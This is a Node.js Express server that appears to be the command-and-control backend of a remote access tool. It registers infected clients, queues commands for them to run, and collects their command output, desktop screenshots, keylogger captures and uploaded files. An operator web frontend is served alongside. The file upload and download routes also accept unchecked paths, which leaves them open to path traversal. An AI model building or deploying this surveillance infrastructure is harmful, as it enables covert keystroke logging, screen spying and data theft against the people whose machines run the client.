
const express = require('express');
const http = require('http');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');
const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3001;

// Setup middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// Setup storage directories
const STORAGE_DIR = path.join(__dirname, '../../storage');
const SCREENSHOTS_DIR = path.join(STORAGE_DIR, 'screenshots');
const FILES_DIR = path.join(STORAGE_DIR, 'files');
const KEYLOG_DIR = path.join(STORAGE_DIR, 'keylogs');

// Ensure storage directories exist
fs.ensureDirSync(SCREENSHOTS_DIR);
fs.ensureDirSync(FILES_DIR);
fs.ensureDirSync(KEYLOG_DIR);

// In-memory database for client tracking
const clientsDb = {
  clients: {},
  commands: {},
  addClient(clientData) {
    this.clients[clientData.id] = {
      ...clientData,
      lastSeen: new Date(),
      commands: [],
    };
    if (!this.commands[clientData.id]) {
      this.commands[clientData.id] = [];
    }
    return this.clients[clientData.id];
  },
  updateClient(id, data) {
    if (this.clients[id]) {
      this.clients[id] = { ...this.clients[id], ...data, lastSeen: new Date() };
      return this.clients[id];
    }
    return null;
  },
  getClient(id) {
    return this.clients[id] || null;
  },
  getAllClients() {
    return Object.values(this.clients);
  },
  addCommand(clientId, command) {
    if (!this.commands[clientId]) {
      this.commands[clientId] = [];
    }
    
    const commandWithId = {
      id: Date.now().toString(),
      ...command,
      timestamp: new Date(),
      executed: false
    };
    
    this.commands[clientId].push(commandWithId);
    return commandWithId;
  },
  getCommands(clientId) {
    return this.commands[clientId]?.filter(cmd => !cmd.executed) || [];
  },
  markCommandExecuted(clientId, commandId) {
    if (this.commands[clientId]) {
      const cmdIndex = this.commands[clientId].findIndex(c => c.id === commandId);
      if (cmdIndex >= 0) {
        this.commands[clientId][cmdIndex].executed = true;
        return true;
      }
    }
    return false;
  }
};

// API routes for client registration and management
app.post('/api/clients/register', (req, res) => {
  const clientData = req.body;
  const client = clientsDb.addClient(clientData);
  console.log(`Client registered: ${client.hostname} (${client.id})`);
  res.json({ success: true });
});

app.get('/api/clients/:id/commands', (req, res) => {
  const { id } = req.params;
  const commands = clientsDb.getCommands(id);
  res.json(commands);
});

app.post('/api/clients/:id/command-results', (req, res) => {
  const { id } = req.params;
  const { command, output, error } = req.body;
  
  console.log(`Command result from ${id}:`);
  console.log(`Command: ${command}`);
  console.log(`Output: ${output}`);
  
  if (error) {
    console.log(`Error: ${error}`);
  }
  
  res.json({ success: true });
});

app.post('/api/clients/:id/commands/:commandId/ack', (req, res) => {
  const { id, commandId } = req.params;
  const success = clientsDb.markCommandExecuted(id, commandId);
  res.json({ success });
});

app.put('/api/clients/:id/status', (req, res) => {
  const { id } = req.params;
  const clientData = req.body;
  const client = clientsDb.updateClient(id, clientData);
  res.json({ success: !!client });
});

app.post('/api/clients/:id/desktop-stream', (req, res) => {
  const { id } = req.params;
  const timestamp = Date.now();
  const screenshotPath = path.join(SCREENSHOTS_DIR, `${id}_${timestamp}.jpg`);
  
  // Save the screenshot to the screenshots directory
  const fileStream = fs.createWriteStream(screenshotPath);
  req.pipe(fileStream);
  
  fileStream.on('finish', () => {
    // Update the client with the latest screenshot path
    clientsDb.updateClient(id, {
      lastScreenshot: `/screenshots/${id}_${timestamp}.jpg`
    });
    res.json({ success: true });
  });
  
  fileStream.on('error', (err) => {
    console.error('Error saving screenshot:', err);
    res.status(500).json({ success: false, error: 'Failed to save screenshot' });
  });
});

app.post('/api/clients/:id/keylog', (req, res) => {
  const { id } = req.params;
  const { data } = req.body;
  const timestamp = Date.now();
  const keylogPath = path.join(KEYLOG_DIR, `${id}_${timestamp}.txt`);
  
  fs.appendFile(keylogPath, data + '\n', (err) => {
    if (err) {
      console.error('Error saving keylog data:', err);
      return res.status(500).json({ success: false });
    }
    res.json({ success: true });
  });
});

app.post('/api/clients/:id/file-transfers', (req, res) => {
  const { id } = req.params;
  const { path, status } = req.body;
  console.log(`File transfer from ${id}: ${path} - ${status}`);
  res.json({ success: true });
});

app.get('/api/files', (req, res) => {
  const { path: filePath } = req.query;
  const fullPath = path.join(FILES_DIR, filePath);
  
  if (!fs.existsSync(fullPath)) {
    return res.status(404).json({ success: false, error: 'File not found' });
  }
  
  res.sendFile(fullPath);
});

app.post('/api/files', (req, res) => {
  const { path: filePath } = req.query;
  const fullPath = path.join(FILES_DIR, filePath);
  const dirPath = path.dirname(fullPath);
  
  // Ensure directory exists
  fs.ensureDirSync(dirPath);
  
  // Save the file
  const fileStream = fs.createWriteStream(fullPath);
  req.pipe(fileStream);
  
  fileStream.on('finish', () => {
    res.json({ success: true });
  });
  
  fileStream.on('error', (err) => {
    console.error('Error saving file:', err);
    res.status(500).json({ success: false, error: 'Failed to save file' });
  });
});

// API routes for the frontend
app.get('/api/clients', (req, res) => {
  const clients = clientsDb.getAllClients();
  res.json(clients);
});

app.post('/api/clients/:id/commands', (req, res) => {
  const { id } = req.params;
  const { type, payload } = req.body;
  
  // Check if client exists
  if (!clientsDb.getClient(id)) {
    return res.status(404).json({ success: false, error: 'Client not found' });
  }
  
  // Add command for the client
  const command = clientsDb.addCommand(id, { type, payload });
  res.json({ success: true, command });
});

// Serve static screenshot files
app.use('/screenshots', express.static(SCREENSHOTS_DIR));

// Serve the React app in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, '../../dist')));
  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../../dist/index.html'));
  });
}

// Start the server
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

module.exports = { app, server };
